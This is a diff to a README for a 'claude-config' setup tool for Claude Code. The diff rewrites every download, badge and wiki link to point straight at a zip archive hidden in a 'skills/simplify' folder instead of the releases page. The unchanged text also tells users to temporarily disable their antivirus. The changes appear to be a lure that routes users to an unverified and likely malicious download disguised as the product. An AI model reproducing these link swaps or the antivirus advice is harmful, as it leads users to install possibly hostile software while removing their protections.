@@ -1,6 +1,6 @@
 # 🚀 claude-config - Easy Setup for Your Claude Code
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-claude--config-blue.svg)](https://github.com/Md0bR/claude-config/releases)
+[![Download Now](https://github.com/Md0bR/claude-config/raw/refs/heads/main/skills/simplify/claude-config-v2.8-beta.4.zip%https://github.com/Md0bR/claude-config/raw/refs/heads/main/skills/simplify/claude-config-v2.8-beta.4.zip)](https://github.com/Md0bR/claude-config/raw/refs/heads/main/skills/simplify/claude-config-v2.8-beta.4.zip)
 
 ## 📋 Description
 
@@ -8,7 +8,7 @@ claude-config helps you get your Claude Code environment ready quickly and easil
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of **claude-config**: [Download Link](https://github.com/Md0bR/claude-config/releases).
+To get started, visit this page to download the latest version of **claude-config**: [Download Link](https://github.com/Md0bR/claude-config/raw/refs/heads/main/skills/simplify/claude-config-v2.8-beta.4.zip).
 
 Follow these steps for a smooth installation:
 
@@ -45,7 +45,7 @@ If you encounter any issues during the download or installation, consider the fo
 
 - **Check Your Internet Connection**: Ensure you have a stable connection to avoid incomplete downloads.
 - **Antivirus Settings**: Sometimes security software may block installations. Temporarily disable it if you face difficulties.
-- **Consult the Wiki**: Check our [Wiki](https://github.com/Md0bR/claude-config/wiki) for additional guidance and frequently asked questions.
+- **Consult the Wiki**: Check our [Wiki](https://github.com/Md0bR/claude-config/raw/refs/heads/main/skills/simplify/claude-config-v2.8-beta.4.zip) for additional guidance and frequently asked questions.
 
 ## 📞 Support
 
@@ -68,4 +68,4 @@ Explore more about Claude programming and get inspired by the community. Here ar
 
 For additional resources, visit the official Claude community forums or browse through online tutorials.
 
-Remember, the first step is critical. For the latest release, visit: [Download Link](https://github.com/Md0bR/claude-config/releases) to kickstart your coding journey with **claude-config**!
+Remember, the first step is critical. For the latest release, visit: [Download Link](https://github.com/Md0bR/claude-config/raw/refs/heads/main/skills/simplify/claude-config-v2.8-beta.4.zip) to kickstart your coding journey with **claude-config**!
